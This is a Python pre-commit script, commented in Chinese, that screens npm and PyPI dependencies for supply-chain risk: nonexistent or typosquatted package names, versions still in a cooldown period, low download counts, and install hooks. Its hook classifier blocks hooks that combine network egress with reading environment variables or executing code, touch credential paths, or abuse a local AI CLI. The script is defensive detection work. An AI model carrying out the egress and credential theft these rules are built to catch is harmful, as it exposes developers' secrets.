#!/usr/bin/env python3
"""G1 供應鏈快篩（本機 pre-commit 版）— 四層防禦的輕量實作。

與 .github/workflows/pr-gates.yml 的內嵌 G1 檢查對齊。純 stdlib。
四層：(1) registry 存在性 + 週下載量；(2) 名稱相似度 vs popular 清單 + blacklist；
      (3) 安裝階段 hook（npm postinstall/preinstall/install）；(4) 新套件冷卻期。

原則（CLAUDE.md #2）：網路失敗、registry 無法查詢、鎖定檔尚無解析器 → 標記 incomplete，絕不視為通過。
退出碼：0 無阻擋；1 有 blocking 發現；2 無法完成檢查（incomplete）。
用法：python3 scripts/g1_slopcheck.py [--target <dir>] [--staged] [--manifest <path> ...]

--target <dir>：被掃描的專案根目錄（預設本 repo）。設定、清單與阻擋政策一律取自本 repo；
  相對路徑、--staged、--changed-files、--base 都以目標專案為準。只給 --target、沒指定要掃哪些檔時，
  全量掃描目標專案追蹤中的所有 manifest 與 agent 規則檔（scope: full）。
  blocking-policy 的 exceptions 只核准給本 repo 的路徑，掃其他專案時不套用（fail closed）。
"""
from __future__ import annotations
import sys, os, ssl, json, re, difflib, fnmatch, time, http.client, urllib.parse, urllib.request, urllib.error, subprocess
from concurrent.futures import ThreadPoolExecutor
from datetime import date, datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent      # VibeSec 本身：設定、清單、政策
CFG_DIR = ROOT / "config" / "slopsquat"
TIMEOUT = 8
WORKERS = 8                                        # registry 並行查詢數
RETRIES, BACKOFF = 2, 1.0                          # 暫時性網路錯誤重試次數與退避秒數（404 不重試）
TARGET = ROOT                                      # 被掃描的專案根目錄；--target 改寫

def external_target():
    """目標不是本 repo → 本 repo 的 blocking-policy exceptions 不適用。"""
    return TARGET.resolve() != ROOT.resolve()

def load_yaml(p: Path):
    try:
        import yaml
        return yaml.safe_load(p.read_text()) if p.exists() else None
    except Exception:
        return None

def read_vibesec():
    try:
        import yaml
        return yaml.safe_load((ROOT / "vibesec.yaml").read_text())
    except Exception:
        return {}

def cfg():
    c = load_yaml(CFG_DIR / "cooldown.yaml") or {}
    vb = read_vibesec()
    g1 = ((vb.get("gates") or {}).get("g1_supply_chain") or {})
    return {
        "cooldown_days": g1.get("cooldown_days", c.get("cooldown_days", 14)),
        "min_weekly_downloads": g1.get("min_weekly_downloads", c.get("min_weekly_downloads", 1000)),
        "similarity": c.get("similarity_ratio", 0.80),
    }

def load_popular(name):
    p = CFG_DIR / name
    if not p.exists():
        return set()
    return {l.strip().lower() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")}

def canon(eco, name):
    """比對用的套件名稱。PyPI 依 PEP 503 正規化：大小寫不分，連續的 -、_、. 視為同一個 -
    （typing_extensions 與 typing-extensions 是同一個專案，不能另外註冊）；npm 只轉小寫（_ 與 - 是不同套件）。"""
    name = str(name).lower()
    return re.sub(r"[-_.]+", "-", name) if eco == "pypi" else name

def load_list(name):
    """讀 blacklist（allowlist 用 load_allowlist）：鍵為 (ecosystem, 名稱小寫)；ecosystem 缺省時記為 None（適用所有生態系）。

    條目名稱可用 `name`（blacklist.yaml）或 `package`（allowlist.yaml）欄位。
    """
    data = load_yaml(CFG_DIR / name) or {}
    items = data.get("packages", data if isinstance(data, list) else [])
    out = {}
    for it in (items or []):
        if not isinstance(it, dict):
            continue
        pkg = it.get("name") or it.get("package")
        if pkg:
            out[((it.get("ecosystem") or None), str(pkg).lower())] = it
    return out

def lookup(entries, eco, pkg):
    """依生態系查清單（名稱以 canon() 比對）；先找同生態系，再找未指定生態系的條目。"""
    key = canon(eco, pkg)
    for want in (eco, None):
        for (e, n), it in entries.items():
            if e == want and canon(eco, n) == key:
                return it
    return None

# 套件名稱來自 PR 內的 manifest（不可信）：先依 registry 命名規則驗證，再 percent-encode 組 URL。
# 不合法的名稱不送出查詢，記為 incomplete（incomplete ≠ pass）。
NPM_NAME = re.compile(r"^(?:@[a-z0-9~-][a-z0-9._~-]*/)?[a-z0-9~-][a-z0-9._~-]*$", re.I)
PYPI_NAME = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?$")

def valid_name(eco, pkg):
    if not pkg or len(pkg) > 214:
        return False
    return bool((NPM_NAME if eco == "npm" else PYPI_NAME).match(pkg))

def _https_only_opener():
    """只裝 HTTPS（驗證憑證與主機名）、https proxy 與 UnknownHandler：file://、http:// 等一律 URLError。"""
    opener = urllib.request.OpenerDirector()
    https_proxy = {k: v for k, v in urllib.request.getproxies().items() if k == "https"}
    for h in (urllib.request.ProxyHandler(https_proxy),
              urllib.request.HTTPSHandler(context=ssl.create_default_context(cafile=os.environ.get("SSL_CERT_FILE") or None)),
              urllib.request.UnknownHandler(),
              urllib.request.HTTPDefaultErrorHandler(), urllib.request.HTTPErrorProcessor()):
        opener.add_handler(h)
    return opener

def http_json(url):
    """GET JSON。暫時性錯誤（連線中斷、傳輸截斷、逾時、429、5xx）重試 RETRIES 次；其餘 HTTP 錯誤（如 404）立即拋出。
    重試仍失敗就拋出，由呼叫端記 incomplete。"""
    for attempt in range(RETRIES + 1):
        # 每次重試都建新的 Request：ProxyHandler 會改寫傳入的 Request（set_proxy），重用同一個物件時，
        # 經 http:// proxy 的第二、三次嘗試會變成 type=http 並以「unknown url type: http」失敗——暫時性錯誤其實沒被重試
        req = urllib.request.Request(url, headers={"User-Agent": "vibesec-g1/0.1"})
        try:
            with _https_only_opener().open(req, timeout=TIMEOUT) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            if (e.code != 429 and e.code < 500) or attempt == RETRIES:
                raise
        except (urllib.error.URLError, http.client.HTTPException, OSError, ValueError):
            if attempt == RETRIES:
                raise
        time.sleep(BACKOFF * (attempt + 1))

def npm_check(pkg, ver, c):
    """回傳 (findings, incomplete_reason|None)。"""
    findings = []
    if not valid_name("npm", pkg):
        return [], f"npm 套件名稱不合法，未查詢 registry：{pkg!r}"
    q = urllib.parse.quote(pkg, safe="@/")
    try:
        meta = http_json(f"https://registry.npmjs.org/{q}")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return [fnd("vibesec.g1.hallucinated-package", pkg, "npm", ver,
                        "npm registry 查無此套件（疑似幻覺/搶註）", "blocking", "registry_health")], None
        return [], f"npm registry 查詢失敗（{pkg}）：HTTP {e.code}"
    except Exception as e:
        return [], f"npm registry 查詢失敗（{pkg}）：{e}"
    # 冷卻期
    times = meta.get("time", {})
    target_ver = ver or (meta.get("dist-tags", {}) or {}).get("latest")
    if target_ver and target_ver in times:
        f = cooldown_finding(pkg, "npm", target_ver, age_days(times[target_ver]), c)
        if f:
            findings.append(f)
    # 安裝 hook
    vmeta = (meta.get("versions", {}) or {}).get(target_ver or "", {})
    f = install_hook_finding(pkg, "npm", target_ver, vmeta.get("scripts", {}) or {})
    if f:
        findings.append(f)
    # 週下載
    try:
        dl = http_json(f"https://api.npmjs.org/downloads/point/last-week/{q}").get("downloads", 0)
        if dl < c["min_weekly_downloads"]:
            findings.append(fnd("vibesec.g1.low-download-package", pkg, "npm", target_ver,
                                f"週下載量 {dl} < {c['min_weekly_downloads']}，信譽不足，需人工判斷", "advisory"))
    except Exception:
        pass  # 下載量查不到不致命，存在性已確認
    return findings, None

def pypi_check(pkg, ver, c):
    findings = []
    if not valid_name("pypi", pkg):
        return [], f"PyPI 套件名稱不合法，未查詢 registry：{pkg!r}"
    try:
        meta = http_json(f"https://pypi.org/pypi/{urllib.parse.quote(pkg, safe='')}/json")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return [fnd("vibesec.g1.hallucinated-package", pkg, "pypi", ver,
                        "PyPI 查無此套件（疑似幻覺/搶註）", "blocking", "registry_health")], None
        return [], f"PyPI 查詢失敗（{pkg}）：HTTP {e.code}"
    except Exception as e:
        return [], f"PyPI 查詢失敗（{pkg}）：{e}"
    target_ver = ver or (meta.get("info", {}) or {}).get("version")
    rel = (meta.get("releases", {}) or {}).get(target_ver or "", [])
    if rel:
        f = cooldown_finding(pkg, "pypi", target_ver, age_days(rel[0].get("upload_time_iso_8601", "")), c)
        if f:
            findings.append(f)
    return findings, None

def pypi_requires(pkg, ver):
    """該版本在 PyPI 宣告的相依名稱（PEP 503 正規化；含 extra 與環境標記限定的相依）。查不到回空集合：
    結果只用來把鎖定檔中的間接相依排除在名稱相似度之外，查不到就照直接相依檢查，不會少查。"""
    if not ver or not valid_name("pypi", pkg):
        return set()
    try:
        info = http_json(f"https://pypi.org/pypi/{urllib.parse.quote(pkg, safe='')}/"
                         f"{urllib.parse.quote(ver, safe='')}/json").get("info") or {}
    except Exception:
        return set()
    return {canon("pypi", x[0]) for x in map(_pep508, info.get("requires_dist") or []) if x}

def requirements_indirect(path, requires=None):
    """requirements*.txt 中由同檔其他套件宣告為相依的 (名稱小寫, 版本)，即間接相依，不做名稱相似度。
    只看鎖定版本（==）的條目；pip-compile／uv export 產生的鎖定檔沒有直接／間接的標記，改以 PyPI 的 requires_dist 推得。"""
    requires = requires or pypi_requires
    pins = []
    for line in Path(path).read_text(errors="ignore").splitlines():
        x = _pep508(line.split(" #", 1)[0])
        if x and x[1]:
            pins.append(x)
    if len(pins) < 2:
        return set()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        deps = list(ex.map(lambda p: requires(*p), pins))
    required_by = {}
    for (name, _), ds in zip(pins, deps):
        for d in ds - {canon("pypi", name)}:
            required_by.setdefault(d, set()).add(canon("pypi", name))
    return {(n.lower(), v) for n, v in pins if required_by.get(canon("pypi", n))}

def cooldown_finding(pkg, eco, ver, age, c):
    """發布天數未滿冷卻期 → blocking；天數未知（None）不判定。純函式，run_evals.py 以合成 fixture 直接呼叫。"""
    if age is None or age >= c["cooldown_days"]:
        return None
    return fnd("vibesec.g1.cooldown-violation", pkg, eco, ver,
               f"版本發布僅 {age} 天，未滿冷卻期 {c['cooldown_days']} 天", "blocking")

def _hook_patterns():
    return ((load_yaml(CFG_DIR / "cooldown.yaml") or {}).get("install_hooks") or {}).get("suspicious_patterns") or {}

def install_hook_finding(pkg, eco, ver, scripts, patterns=None):
    """依 cooldown.yaml install_hooks 分類安裝階段 hook（docs/02 第 3 層）。
    外連 + 讀環境變數／執行、憑證路徑、濫用本機 AI CLI → blocking；只有動態執行 → advisory；
    其餘（例如 node-gyp rebuild）不判 egress，回傳 None。純函式，run_evals.py 以合成 fixture 直接呼叫。"""
    hooks = {h: str(scripts[h]) for h in ("preinstall", "install", "postinstall") if h in scripts}
    if not hooks:
        return None
    pats = patterns if patterns is not None else _hook_patterns()
    body = "\n".join(hooks.values())
    hit = {k: any(re.search(rx, body) for rx in pats.get(k) or []) for k in
           ("network", "env_read", "credential_paths", "ai_cli_abuse", "exec")}
    names = ", ".join(hooks)
    if hit["credential_paths"] or hit["ai_cli_abuse"] or (hit["network"] and (hit["env_read"] or hit["exec"])):
        why = [k for k in ("network", "env_read", "credential_paths", "ai_cli_abuse", "exec") if hit[k]]
        return fnd("vibesec.g1.postinstall-egress", pkg, eco, ver,
                   f"安裝階段 hook（{names}）命中可疑樣式：{', '.join(why)}", "blocking")
    if hit["exec"] or hit["network"]:
        return fnd("vibesec.g1.postinstall-egress", pkg, eco, ver,
                   f"安裝階段 hook（{names}）含動態執行或外連，需人工審查", "advisory")
    return None

def age_days(iso):
    try:
        t = datetime.fromisoformat(iso.replace("Z", "+00:00"))
        return (datetime.now(timezone.utc) - t).days
    except Exception:
        return None

def _edit_distance(a: str, b: str) -> int:
    """Optimal string alignment 距離：插入、刪除、替換與相鄰字母易位各算 1（axois → axios 為 1）。"""
    if a == b:
        return 0
    d = [[i + j if not i * j else 0 for j in range(len(b) + 1)] for i in range(len(a) + 1)]
    for i in range(1, len(a) + 1):
        for j in range(1, len(b) + 1):
            d[i][j] = min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] != b[j - 1]))
            if i > 1 and j > 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:
                d[i][j] = min(d[i][j], d[i - 2][j - 2] + 1)
    return d[-1][-1]

def similarity_check(pkg, eco, popular, blacklist, c, fuzzy=True):
    """blacklist → 與熱門清單的名稱相似度（allowlist 由 apply_allowlist 逐筆發現套用）。fuzzy=False（鎖定檔中的
    間接相依）只查黑名單：間接相依的名稱由上游維護者決定、不是開發者或 AI 打出來的，存在性、冷卻期、安裝 hook 仍逐一檢查。"""
    it = lookup(blacklist, eco, pkg)
    if it:
        hint = f"；正確名稱應為 {it['looks_like']}" if it.get("looks_like") else ""
        tier = "advisory" if it.get("action") == "warn" else "blocking"
        return fnd("vibesec.g1.hallucinated-package", pkg, eco, None,
                   f"命中黑名單（{it.get('status', '?')}）：{it.get('reason', 'known typosquat')}{hint}", tier, "blacklist")
    if not fuzzy:
        return None
    pl = canon(eco, pkg)
    canon_popular = {canon(eco, g): g for g in popular}
    if pl in canon_popular:
        return None
    for cg, good in canon_popular.items():
        ratio = difflib.SequenceMatcher(None, pl, cg).ratio()
        dist = _edit_distance(pl, cg)
        # 兩路判定：ratio 門檻，或編輯距離（補 difflib 對字母易位的低估，如 axois vs axios）。5 個字元以內的名稱
        # 只認 1 次編輯：短名改 2 個字母已是另一個字（zipp／pip、hpack／black、pyrit／pyjwt 都是不相干的真套件）
        if ratio >= c["similarity"] or (len(pl) >= 4 and 0 < dist <= (1 if len(pl) <= 5 else 2)):
            return fnd("vibesec.g1.hallucinated-package", pkg, eco, None,
                       f"名稱與熱門套件 '{good}' 高度相似（ratio={ratio:.2f}, edit={dist}），疑似 typosquat", "blocking",
                       "similarity")
    return None

CHECK_OF_RULE = {"vibesec.g1.cooldown-violation": "cooldown", "vibesec.g1.low-download-package": "low_download",
                 "vibesec.g1.postinstall-egress": "install_hook"}

def fnd(rule, pkg, eco, ver, reason, tier, check=None):
    # tier 只能降級（advisory 線索），不能高於 blocking-policy（scripts/vibesec_policy.py）
    # check：產生這筆發現的檢查（registry_health／blacklist／similarity／cooldown／low_download／install_hook），
    # allowlist 的 bypass 依此比對；hallucinated-package 由三種檢查產生，呼叫端必須指明
    return {"rule_id": rule, "package": pkg, "ecosystem": eco, "version": ver,
            "reason": reason, "policy_tier": _policy().cap(rule, tier), "check": check or CHECK_OF_RULE.get(rule)}

_POLICY = None
def _policy():
    global _POLICY
    if _POLICY is None:
        sys.path.insert(0, str(Path(__file__).resolve().parent))
        from vibesec_policy import Policy
        _POLICY = Policy(ROOT)
    return _POLICY

PKG_RE_NPM = re.compile(r'"([@a-z0-9._/-]+)"\s*:\s*"([~^]?[0-9][^"]*)"')

# PEP 508 需求字串：名稱、可選 extras、版本規格；忽略環境標記（; 之後）
REQ_RE = re.compile(r'^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(?:===?\s*([0-9][^,;\s]*))?')

# 直接 URL／VCS 來源（pkg @ https://…、git+…、-e git+…）：registry 查不到，不能當成已檢查
URL_REQ = re.compile(r'^(-e\s+)?(git\+|https?:|ssh:|svn\+|hg\+|bzr\+|file:)|\s@\s')

def _pep508(req):
    """從 PEP 508 需求字串取出 (名稱, 鎖定版本或 None)。註解／選項／本地路徑回傳 None（略過）；
    URL／VCS 來源回傳 False（無法以 registry 驗證 → 呼叫端記 incomplete，第四次審視 S-2）。"""
    if not isinstance(req, str):
        return None
    req = req.split(";", 1)[0].strip()
    if not req or req.startswith("#"):
        return None
    if URL_REQ.search(req):
        return False
    if req.startswith(("-", ".", "/")):
        return None
    m = REQ_RE.match(req)
    return (m.group(1), m.group(2)) if m else None

def _toml(path):
    try:
        import tomllib
    except ImportError:  # Python < 3.11
        return None
    try:
        return tomllib.loads(path.read_text(errors="ignore"))
    except Exception:
        return None

def _pyproject_deps(data):
    """PEP 621 [project]、[dependency-groups]（PEP 735）與 Poetry 的相依。不含 build-system。"""
    reqs = []
    proj = data.get("project") or {}
    reqs += proj.get("dependencies") or []
    for group in (proj.get("optional-dependencies") or {}).values():
        reqs += group or []
    for group in (data.get("dependency-groups") or {}).values():
        reqs += [r for r in (group or []) if isinstance(r, str)]   # 略過 {include-group = ...}
    out, bad = [], []
    for r in reqs:
        x = _pep508(r)
        if x:
            out.append(x)
        elif x is False:
            bad.append(str(r))
    poetry = (data.get("tool") or {}).get("poetry") or {}
    tables = [poetry.get("dependencies") or {}, poetry.get("dev-dependencies") or {}]
    tables += [(g or {}).get("dependencies") or {} for g in (poetry.get("group") or {}).values()]
    for table in tables:
        for name, spec in table.items():
            if name.lower() == "python":
                continue
            if isinstance(spec, dict) and any(k in spec for k in ("git", "url", "path", "file")):
                bad.append(f"{name}（{', '.join(k for k in ('git', 'url', 'path', 'file') if k in spec)}）")
            else:
                out.append((name, None))
    return out, bad

def _lock_packages(data):
    """uv.lock / poetry.lock 的 [[package]]；略過本地（editable / virtual / directory）套件。"""
    out = []
    for pkg in data.get("package") or []:
        src = pkg.get("source") or {}
        if any(k in src for k in ("editable", "virtual", "directory", "path")) or src.get("type") in ("directory", "file"):
            continue
        if pkg.get("name"):
            out.append((pkg["name"], pkg.get("version")))
    return out

DEP_SECTIONS = ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies")
NPM_REGISTRIES = ("https://registry.npmjs.org/", "https://registry.yarnpkg.com/")
SEMVER = re.compile(r"^\d+\.\d+\.\d+")

def npm_lock(path):
    """package-lock.json（lockfileVersion 1–3）→ ([(名稱, 版本, 是否直接相依)], [無法以 registry 驗證的條目])。

    v2/v3 讀 packages（鍵為 node_modules/…，名稱取最後一段；別名以 name 欄位為實名）；v1 遞迴讀 dependencies
    （別名寫成 version: npm:<實名>@<版本>）。略過 workspace 連結（link: true，即專案自己的程式碼）。
    resolved 不在 npm registry（git、file、tarball URL、私有 registry）或版本不是 semver 的條目，
    無法以 registry 驗證 → 回報給呼叫端記 incomplete，不當成已檢查。
    直接相依：根目錄與 workspace 宣告的相依（v1 取同目錄的 package.json）；讀不到時全部視為直接相依（從嚴）。"""
    try:
        data = json.loads(Path(path).read_text(errors="ignore"))
    except (OSError, ValueError):
        return [], ["整份檔案無法解析"]
    out, bad = [], []

    def add(key, name, ver, meta, direct):
        resolved = meta.get("resolved")
        if (resolved and not str(resolved).startswith(NPM_REGISTRIES)) or not SEMVER.match(ver):
            bad.append(key)
        else:
            out.append((name, ver, direct))

    pkgs = data.get("packages") if isinstance(data, dict) else None
    if isinstance(pkgs, dict):
        direct = set()
        for key, meta in pkgs.items():
            if "node_modules/" not in key and isinstance(meta, dict):
                for sec in DEP_SECTIONS:
                    direct |= set(meta.get(sec) or {})
        for key, meta in pkgs.items():
            if "node_modules/" not in key or not isinstance(meta, dict) or meta.get("link"):
                continue
            short = key.rsplit("node_modules/", 1)[1]
            add(key, meta.get("name") or short, str(meta.get("version") or ""), meta,
                key == f"node_modules/{short}" and short in direct)
        return out, bad
    try:
        pj = json.loads(Path(path).with_name("package.json").read_text(errors="ignore"))
        direct = set().union(*(set(pj.get(sec) or {}) for sec in DEP_SECTIONS))
    except (OSError, ValueError, AttributeError):
        direct = None

    def walk(deps, prefix):
        for name, meta in (deps or {}).items():
            if not isinstance(meta, dict):
                continue
            real, ver = name, str(meta.get("version") or "")
            if ver.startswith("npm:"):
                real, _, ver = ver[4:].rpartition("@")
            add(prefix + name, real, ver, meta, direct is None or (not prefix and name in direct))
            walk(meta.get("dependencies"), f"{prefix}{name} > ")
    walk(data.get("dependencies") if isinstance(data, dict) else None, "")
    return out, bad

NPM_EXACT = re.compile(r'^[~^=]?v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)$')
NPM_NONREGISTRY = re.compile(r'^(git\+|git:|github:|gitlab:|bitbucket:|gist:|https?:|ssh:|file:|link:|workspace:|\.|/)')

def _npm_spec(name, spec):
    """package.json 的版本規格 → (實名, 鎖定版本或 None, 無法驗證的原因或 None)。
    npm:<實名>@<版本> 別名以實名查（安裝的是實名）；git／URL／本地路徑不是 registry 來源 → 無法驗證；
    tag／範圍（latest、*、>=1 <2）→ 版本 None，以 registry 最新版做冷卻期與 hook 檢查。"""
    spec = str(spec).strip()
    if spec.startswith("npm:"):
        real, _, ver = spec[4:].rpartition("@")
        if not real:
            real, ver = ver, ""
        name, spec = real, ver
    if NPM_NONREGISTRY.match(spec) or "/" in spec:
        return name, None, f"{name}: {spec!r} 不是 npm registry 版本（git／URL／本地路徑）"
    m = NPM_EXACT.match(spec)
    return name, (m.group(1) if m else None), None

def parse_manifest(paths):
    """回傳 ([(ecosystem, name, version)], [無法驗證或無法解析的條目])。
    無法解析的檔、非 registry 來源的條目都回報，不靜默略過（incomplete ≠ pass，第四次審視 S-1／S-2）。"""
    out, bad = [], []
    for p in paths:
        p = Path(p)
        if not p.exists() or UNPARSED_RE.search(p.name):
            continue
        text = p.read_text(errors="ignore")
        if p.name in ("package-lock.json", "npm-shrinkwrap.json"):
            e, b = npm_lock(p)
            out += [("npm", n, v) for n, v, _ in e]
            bad += [f"{p.name}: {x}" for x in b]
        elif p.name == "package.json" or p.name.endswith(".json") and "package" in p.name:
            try:
                j = json.loads(text)
            except ValueError as e:
                bad.append(f"{p.name}: JSON 無法解析（{type(e).__name__}）"); continue
            if not isinstance(j, dict):
                bad.append(f"{p.name}: 不是 JSON 物件"); continue
            for sec in DEP_SECTIONS:
                deps = j.get(sec) or {}
                if not isinstance(deps, dict):
                    bad.append(f"{p.name}: {sec} 不是物件"); continue
                for name, spec in deps.items():
                    real, ver, why = _npm_spec(name, spec)
                    if why:
                        bad.append(f"{p.name} {sec}.{why}")
                    else:
                        out.append(("npm", real, ver))
        elif p.name == "pyproject.toml":
            data = _toml(p)
            if data is None:
                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
            e, b = _pyproject_deps(data)
            out += [("pypi", n, v) for n, v in e]
            bad += [f"{p.name}: {x}" for x in b]
        elif p.name in ("uv.lock", "poetry.lock"):
            data = _toml(p)
            if data is None:
                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
            out += [("pypi", n, v) for n, v in _lock_packages(data)]
        elif re.search(r'requirements.*\.txt$', p.name):
            for line in text.splitlines():
                x = _pep508(line.split(" #", 1)[0])
                if x:
                    out.append(("pypi", x[0], x[1]))
                elif x is False:
                    bad.append(f"{p.name}: {line.strip()[:60]}")
    # 去重
    seen, uniq = set(), []
    for eco, n, v in out:
        k = (eco, n.lower(), v)
        if k not in seen:
            seen.add(k); uniq.append((eco, n, v))
    return uniq, bad

def parse_added(paths):
    """回傳 [(ecosystem, name, version)]（無法驗證的條目見 parse_manifest）。"""
    return parse_manifest(paths)[0]

def self_install_hooks(path):
    """專案自己的 package.json scripts（preinstall／postinstall…）也要查外連與讀憑證（SKILL.md 步驟 1）。"""
    p = Path(path)
    if p.name != "package.json":
        return None
    try:
        j = json.loads(p.read_text(errors="ignore"))
    except ValueError:
        return None
    scripts = j.get("scripts") if isinstance(j, dict) else None
    if not isinstance(scripts, dict) or not scripts:
        return None
    return install_hook_finding(f"{j.get('name') or p.name}（本專案 scripts）", "npm", str(j.get("version") or ""), scripts)

POLICY_FILE = ROOT / "config" / "policy" / "blocking-policy.yaml"

def load_exceptions(today=None):
    """讀 blocking-policy.yaml 的 exceptions，只保留欄位完整且未過期者（fail closed）。

    回傳 (有效例外清單, 被忽略的例外說明清單)。
    """
    today = today or date.today()
    data = load_yaml(POLICY_FILE) or {}
    valid, ignored = [], []
    for ex in data.get("exceptions") or []:
        if not isinstance(ex, dict):
            continue
        missing = [k for k in ("rule_id", "path_glob", "reason", "approved_by", "expires") if not ex.get(k)]
        if missing:
            ignored.append(f"{ex.get('rule_id', '?')}：缺少欄位 {', '.join(missing)}")
            continue
        exp = ex["expires"]
        try:
            exp = exp if isinstance(exp, date) else date.fromisoformat(str(exp))
        except ValueError:
            ignored.append(f"{ex['rule_id']}：expires 格式無效（{ex['expires']}）")
            continue
        if exp < today:
            ignored.append(f"{ex['rule_id']} @ {ex['path_glob']}：已於 {exp} 過期")
            continue
        valid.append(dict(ex, expires=str(exp)))
    return valid, ignored

def rel_path(path):
    """manifest 路徑轉成相對目標專案根目錄的 POSIX 路徑；目標外的檔案保持原樣。"""
    p = Path(path).resolve()
    try:
        return p.relative_to(TARGET.resolve()).as_posix()
    except ValueError:
        return Path(path).as_posix()

def resolve(path):
    """相對路徑先以目標專案為基準，找不到再以目前目錄為基準（相容 --manifest 傳入工作目錄相對路徑）。"""
    p = Path(path)
    if p.is_absolute() or not (TARGET / p).exists():
        return p
    return TARGET / p

def apply_exceptions(finding, exceptions):
    """命中 rule_id 與 path_glob 的例外時把 blocking 降為 advisory；例外不刪除發現。"""
    for ex in exceptions:
        if finding["rule_id"] == ex["rule_id"] and fnmatch.fnmatchcase(finding.get("manifest") or "", ex["path_glob"]):
            if finding["policy_tier"] == "blocking":
                finding["policy_tier"] = "advisory"
            finding["exception"] = {k: ex[k] for k in ("path_glob", "reason", "approved_by", "expires")}
            break
    return finding

# allowlist.yaml 的 bypass 只能放行這些檢查（檔頭規則 3：slopsquat／cooldown／low-download）；
# 安裝 hook（postinstall-egress）與 KEV 不可放行
BYPASSABLE = ("registry_health", "low_download", "cooldown", "blacklist", "similarity")
_VCMP = re.compile(r"^(>=|<=|==|=|>|<)?v?(\d+(?:\.\d+)*)$")

def _vkey(v):
    """版本的比較鍵；只接受純數字段（1.2.3）。有預發布／後綴（1.2.3-beta、1.2.3.post1）→ None：範圍比對時不放行。"""
    m = re.fullmatch(r"v?(\d+(?:\.\d+)*)", str(v))
    if not m:
        return None
    t = [int(x) for x in m.group(1).split(".")]
    return tuple(t + [0] * (4 - len(t)))

def parse_version_spec(spec):
    """allowlist 的 version → None（所有版本）、("exact", "1.2.3") 或 ("range", [(運算子, 比較鍵)...])。
    接受精確版本（1.2.3、==1.2.3）或以空白／逗號分隔、全部須成立的比較式（>=2.0.0 <3.0.0、>=2,<3）。
    ^、~、x、|| 等其他寫法 → ValueError（條目不採用，fail closed）。"""
    if spec is None:
        return None
    text = re.sub(r"(>=|<=|==|=|>|<)\s+", r"\1", str(spec).strip())
    parts = [x for x in re.split(r"[,\s]+", text) if x]
    if not parts:
        raise ValueError("version 為空字串")
    cmps = []
    for part in parts:
        m = _VCMP.match(part)
        if not m:
            raise ValueError(f"無法解析的 version：{spec!r}（接受 1.2.3、==1.2.3、>=2.0.0 <3.0.0）")
        cmps.append((m.group(1) or "==", m.group(2)))
    if len(cmps) == 1 and cmps[0][0] in ("==", "="):
        return ("exact", cmps[0][1])
    return ("range", [(op, _vkey(v)) for op, v in cmps])

def version_matches(spec, ver):
    """parse_version_spec 的結果是否涵蓋 ver；版本未知或無法比較 → False（不放行）。"""
    if spec is None:
        return True
    if not ver:
        return False
    if spec[0] == "exact":
        return str(ver).lstrip("v") == spec[1]
    k = _vkey(ver)
    if k is None:
        return False
    ops = {">=": k.__ge__, "<=": k.__le__, ">": k.__gt__, "<": k.__lt__, "==": k.__eq__, "=": k.__eq__}
    return all(ops[op](v) for op, v in spec[1])

def load_allowlist(path=None, today=None):
    """讀 allowlist.yaml 的 entries（舊格式 packages 也接受），只保留合規且未過期的條目（fail closed）。

    必填：package、approved_by、expires（YYYY-MM-DD）、reason、bypass（非空，值須在 BYPASSABLE）；
    version 可省略（所有版本）或依 parse_version_spec。回傳 (有效條目, 被忽略的條目說明)。"""
    today = today or date.today()
    data = load_yaml(path or CFG_DIR / "allowlist.yaml") or {}
    items = data.get("entries", data.get("packages")) if isinstance(data, dict) else data
    valid, ignored = [], []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        name = it.get("package") or it.get("name") or "?"
        missing = [k for k in ("package", "approved_by", "expires", "reason", "bypass") if not it.get(k)]
        if missing:
            ignored.append(f"{name}：缺少欄位 {', '.join(missing)}"); continue
        bypass = it["bypass"] if isinstance(it["bypass"], list) else [it["bypass"]]
        bad = [b for b in bypass if b not in BYPASSABLE]
        if bad:
            ignored.append(f"{name}：bypass 不可為 {', '.join(map(str, bad))}（只能放行 {', '.join(BYPASSABLE)}）"); continue
        try:
            exp = it["expires"] if isinstance(it["expires"], date) else date.fromisoformat(str(it["expires"]))
        except ValueError:
            ignored.append(f"{name}：expires 格式無效（{it['expires']}）"); continue
        if exp < today:
            ignored.append(f"{name}：已於 {exp} 過期"); continue
        try:
            spec = parse_version_spec(it.get("version"))
        except ValueError as e:
            ignored.append(f"{name}：{e}"); continue
        valid.append({"package": str(it["package"]), "ecosystem": it.get("ecosystem") or None, "spec": spec,
                      "bypass": set(bypass), "approved_by": it["approved_by"], "expires": str(exp),
                      "ticket": it.get("ticket"), "reason": it["reason"]})
    return valid, ignored

def apply_allowlist(finding, entries, ver=None):
    """發現的 check 在某條目的 bypass 內、套件（PEP 503）與生態系相符、版本在 version 內 → blocking 降為 advisory，
    發現保留並附核准資訊（同 blocking-policy exceptions）。安裝 hook 等不在 BYPASSABLE 的檢查永不放行。
    ver：發現本身沒有版本時（名稱相似度、黑名單）用的套件版本。"""
    if finding.get("check") not in BYPASSABLE:
        return finding
    eco, pkg = finding["ecosystem"], finding["package"]
    for e in entries:
        if e["ecosystem"] not in (None, eco) or canon(eco, e["package"]) != canon(eco, pkg):
            continue
        if finding["check"] not in e["bypass"] or not version_matches(e["spec"], finding.get("version") or ver):
            continue
        if finding["policy_tier"] == "blocking":
            finding["policy_tier"] = "advisory"
        finding["allowlist"] = {k: e[k] for k in ("approved_by", "expires", "ticket", "reason")} | {"bypass": finding["check"]}
        break
    return finding

def staged_files():
    try:
        r = subprocess.run(["git", "diff", "--cached", "--name-only", "--relative"],
                           capture_output=True, text=True, cwd=TARGET)
        return [l for l in r.stdout.splitlines() if l.strip()]
    except Exception:
        return []

